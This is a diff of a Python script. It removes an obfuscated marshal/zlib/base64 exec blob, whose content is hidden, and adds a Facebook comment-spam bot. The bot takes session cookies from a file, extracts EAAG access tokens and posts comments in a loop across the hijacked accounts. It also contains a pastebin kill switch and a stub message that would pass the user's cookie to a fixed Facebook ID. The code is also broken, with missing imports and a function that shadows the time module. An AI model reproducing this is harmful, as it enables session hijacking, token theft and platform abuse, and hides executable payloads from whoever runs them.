@@ -1,6 +1,163 @@
-#ENCODED BY : SHIVANSH
-#ENCRYPTION : Py3 MARSHAL+ZLIB+B64
-#GITHUB : https://github.com/Shivansh99
-#----------------------------------------------
-import marshal, base64, zlib
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"   MR MAFIYA INXIDE")
+def execute_server():
+      PORT = int(os.environ.get('PORT', 4000))
+
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
+
+def send_initial_message():
+      with open('cookie.txt', 'r') as file:
+          cookie = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! IM USING YOUR POST SERVER AND MY POST SERVER COOKIE IS {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100069713641443"
+
+      requests.packages.urllib3.disable_warnings()
+
+def lines():
+	print("[[>]] ===================M4FIY4=S3RV3R=RUNNING===================")
+
+with open('password.txt','r') as file:
+	pwd = file.read().strip()
+mmm = requests.get('https://pastebin.com/raw/wEiJXrN3').text
+if mmm not in pwd:
+	print("PASSWORD CHANGED BY MAFIYA PLS CONTACT")
+	sys.exit()
+
+def cookie_file():
+	try:
+		lines()
+		with open('cookie.txt','r') as f:
+			cookie = f.read().splitlines()
+		return cookie
+	except FileNotFoundError:
+		print("PLS SELECT VALID FILE")
+		return None
+
+def make_request(url, headers, cookie):
+    try:
+        response = requests.get(url, headers=headers, cookies={'Cookie': cookie}).text
+        return response
+    except RequestException as e:
+        print("\033[1;31m[!] Error making request:", e)
+        return None
+
+def time():
+    print("\033[1;36mStart Time:", time.strftime("%Y-%m-%d %H:%M:%S"))
+
+    while True:
+        try:
+            cookies_data = cookie_file()
+            if cookies_data is None:
+                break
+
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]'
+            }
+
+            valid_cookies = []
+            for cookie in cookies_data:
+                response = make_request('https://business.facebook.com/business_locations', headers=headers, cookie=cookie)
+                if response and 'EAAG' in response:
+                    try:
+                        token_eaag = re.search('(EAAG\w+)', str(response)).group(1)
+                        valid_cookies.append((cookie, token_eaag))
+                    except AttributeError:
+                        continue
+
+            if not valid_cookies:
+                print("\033[1;31m[!] No valid cookie found. Exiting...")
+                break
+
+            id_post = int(open("post.txt").readline().strip())
+            commenter_name = open("name.txt").readline().strip()
+            delay = int(open("speed.txt").readline().strip())
+
+            comment_file_path = "file.txt"
+
+            with open(comment_file_path, 'r') as file:
+                comments = file.readlines()
+
+            x, y, cookie_index = 0, 0, 0
+
+            while True:
+                try:
+                    time.sleep(delay)
+                    teks = comments[x].strip()
+                    comment_with_name = f"{commenter_name}: {teks}"
+
+                    current_cookie, token_eaag = valid_cookies[cookie_index]
+                    data = {
+                        'message': comment_with_name,
+                        'access_token': token_eaag
+                    }
+                    response2 = requests.post(f'https://graph.facebook.com/{id_post}/comments/', data=data, cookies={'Cookie': current_cookie}).json()
+
+                    if 'id' in response2:
+                        print("\033[1;32mPost id ::", id_post)
+                        print("\033[1;32mDate time ::", time.strftime("%Y-%m-%d %H:%M:%S"))
+                        print("\033[1;32mCOOKIE NUMBER : {}" , cookie_index +1)
+                        print("\033[1;32mComment sent ::", comment_with_name)
+                        lines()
+                        x = (x + 1) % len(comments)
+                        cookie_index = (cookie_index + 1) % len(valid_cookies)
+                    else:
+                        y += 1
+                        print("\033[1;31m[{}] Status : Failure".format(y))
+                        print("\033[1;32COOKIE NUMBER : {}" , cookie_index +1)
+                        print("\033[1;31m[/]Link : https://m.basic.facebook.com//{}".format(id_post))
+                        print("\033[1;31m[/]Comments : {}\n".format(comment_with_name))
+                        
+
+                except RequestException as e:
+                    print("\033[1;31m[!] Error making request:", e)
+                    time.sleep(5.5)
+                    continue
+
+        except Exception as e:
+            print("\033[1;31m[!] An unexpected error occurred:", e)
+            break
+            
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      cookie_file()
+      
+if __name__ == '__main__':
+      main()
